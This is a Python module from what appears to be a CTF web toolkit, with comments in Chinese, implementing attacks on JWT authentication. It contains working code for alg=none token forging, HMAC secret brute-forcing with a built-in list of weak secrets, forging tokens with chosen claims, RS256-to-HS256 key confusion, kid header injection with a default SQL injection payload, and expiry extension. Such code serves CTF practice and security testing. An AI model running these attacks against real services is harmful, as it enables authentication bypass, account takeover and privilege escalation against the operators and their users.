"""
CTF Web Toolkit - JWT Attack Module
支持：alg=none / HS256→RS256 混淆 / 弱密钥爆破 / kid 注入 / JWK 伪造
"""

import base64
import hashlib
import hmac
import json
import time
from typing import Optional, Dict, List
from core.utils import ok, info, warn, err, found, section

# ── JWT 解析 ─────────────────────────────────
def parse_jwt(token: str) -> Optional[Dict]:
    """解析 JWT 三段结构"""
    parts = token.split(".")
    if len(parts) != 3:
        err("无效的 JWT 格式（需要3段）")
        return None

    def _b64_decode(s: str) -> dict:
        s += "=" * (-len(s) % 4)
        return json.loads(base64.urlsafe_b64decode(s).decode(errors="replace"))

    try:
        return {
            "header":    _b64_decode(parts[0]),
            "payload":   _b64_decode(parts[1]),
            "signature": parts[2],
            "raw":       parts,
        }
    except Exception as e:
        err(f"JWT 解析失败: {e}")
        return None


def print_jwt(token: str):
    """美化打印 JWT"""
    section("JWT 解析")
    result = parse_jwt(token)
    if not result:
        return
    info(f"Header:    {json.dumps(result['header'], indent=2)}")
    info(f"Payload:   {json.dumps(result['payload'], indent=2)}")
    info(f"Signature: {result['signature'][:30]}...")

    # 检查过期时间
    if "exp" in result["payload"]:
        exp = result["payload"]["exp"]
        now = time.time()
        if exp < now:
            warn(f"Token 已过期! (exp={exp}, now={int(now)})")
        else:
            ok(f"Token 未过期 (剩余 {int(exp - now)} 秒)")


# ── 算法 None 攻击 ────────────────────────────
def attack_alg_none(token: str, new_payload: Optional[Dict] = None) -> List[str]:
    """
    将 alg 改为 none/None/NONE，去掉签名
    返回多种变体
    """
    section("alg=none 攻击")
    parsed = parse_jwt(token)
    if not parsed:
        return []

    payload = new_payload or parsed["payload"]
    results = []

    for alg_variant in ["none", "None", "NONE", "nOnE"]:
        header = {"alg": alg_variant, "typ": "JWT"}
        fake_token = _build_jwt(header, payload, "")
        results.append(fake_token)
        info(f"  alg={alg_variant!r}: {fake_token[:80]}...")

    ok(f"生成 {len(results)} 个 alg=none 变体")
    return results


# ── 弱密钥爆破 ────────────────────────────────
COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "test",
    "your-256-bit-secret", "jwt_secret", "secret_key",
    "key", "private", "supersecret", "changeme",
    "development", "production", "hs256", "jwt",
    "", "null", "undefined", "none",
    "mysecret", "secretkey", "jwtkey", "token",
]


def brute_force_secret(token: str, wordlist: Optional[List[str]] = None,
                       wordlist_file: Optional[str] = None) -> Optional[str]:
    """爆破 HMAC 签名密钥"""
    section("HMAC 密钥爆破")
    parsed = parse_jwt(token)
    if not parsed:
        return None

    alg = parsed["header"].get("alg", "HS256")
    if not alg.startswith("HS"):
        warn(f"算法 {alg} 不是 HMAC 类型，跳过爆破")
        return None

    # 构造签名基础
    signing_input = f"{parsed['raw'][0]}.{parsed['raw'][1]}"
    expected_sig = parsed["raw"][2]

    # 确定 hash 函数
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_func = hash_map.get(alg, hashlib.sha256)

    # 准备字典
    secrets = list(COMMON_SECRETS)
    if wordlist:
        secrets.extend(wordlist)
    if wordlist_file:
        try:
            with open(wordlist_file, encoding="utf-8", errors="ignore") as f:
                secrets.extend([l.strip() for l in f if l.strip()])
        except Exception as e:
            err(f"字典文件加载失败: {e}")

    info(f"  测试 {len(secrets)} 个密钥 (算法: {alg})")

    for i, secret in enumerate(secrets):
        sig = hmac.new(secret.encode(), signing_input.encode(), hash_func).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        if sig_b64 == expected_sig:
            found("JWT 密钥", repr(secret))
            return secret
        if (i + 1) % 1000 == 0:
            info(f"  已测试 {i+1} 个...")

    info("  未找到密钥")
    return None


def forge_with_secret(token: str, secret: str, new_claims: Dict) -> str:
    """用已知密钥伪造 JWT"""
    section("JWT 伪造")
    parsed = parse_jwt(token)
    if not parsed:
        return token

    header = parsed["header"]
    payload = {**parsed["payload"], **new_claims}

    # 重新签名
    alg = header.get("alg", "HS256")
    signing_input = (
        _b64url_encode(json.dumps(header, separators=(",", ":"))) + "." +
        _b64url_encode(json.dumps(payload, separators=(",", ":")))
    )

    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hash_func = hash_map.get(alg, hashlib.sha256)
    sig = hmac.new(secret.encode(), signing_input.encode(), hash_func).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()

    forged = f"{signing_input}.{sig_b64}"
    ok(f"伪造 Token: {forged[:80]}...")
    info(f"新 Claims: {json.dumps(new_claims)}")
    return forged


# ── HS256 → RS256 混淆攻击 ───────────────────
def attack_rs256_confusion(token: str, public_key: str, new_payload: Optional[Dict] = None) -> str:
    """
    将 RS256 改为 HS256，用公钥作为 HMAC 密钥签名
    服务器若使用公钥验证 HS256 则会被绕过
    """
    section("RS256→HS256 混淆攻击")
    parsed = parse_jwt(token)
    if not parsed:
        return token

    payload = new_payload or parsed["payload"]
    header = {"alg": "HS256", "typ": "JWT"}

    signing_input = (
        _b64url_encode(json.dumps(header, separators=(",", ":"))) + "." +
        _b64url_encode(json.dumps(payload, separators=(",", ":")))
    )

    sig = hmac.new(public_key.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    forged = f"{signing_input}.{sig_b64}"
    ok(f"RS256→HS256 Token: {forged[:80]}...")
    return forged


# ── kid 注入攻击 ──────────────────────────────
def attack_kid_injection(token: str, secret: str = "secret",
                         kid_payload: str = "' UNION SELECT 'secret'--") -> str:
    """kid 头部 SQL/Path 注入"""
    section("kid 注入攻击")
    parsed = parse_jwt(token)
    if not parsed:
        return token

    header = {**parsed["header"], "kid": kid_payload}
    payload = parsed["payload"]

    signing_input = (
        _b64url_encode(json.dumps(header, separators=(",", ":"))) + "." +
        _b64url_encode(json.dumps(payload, separators=(",", ":")))
    )

    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    forged = f"{signing_input}.{sig_b64}"
    ok(f"kid 注入 Token: {forged[:80]}...")
    info(f"kid 值: {kid_payload!r}")
    return forged


# ── 过期时间修改 ──────────────────────────────
def extend_expiry(token: str, secret: str, extra_seconds: int = 86400 * 365) -> str:
    """延长 JWT 过期时间"""
    parsed = parse_jwt(token)
    if not parsed:
        return token
    new_claims = {"exp": int(time.time()) + extra_seconds}
    return forge_with_secret(token, secret, new_claims)


# ── 内部辅助 ─────────────────────────────────
def _b64url_encode(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()


def _build_jwt(header: dict, payload: dict, signature: str) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")))
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")))
    return f"{h}.{p}.{signature}"
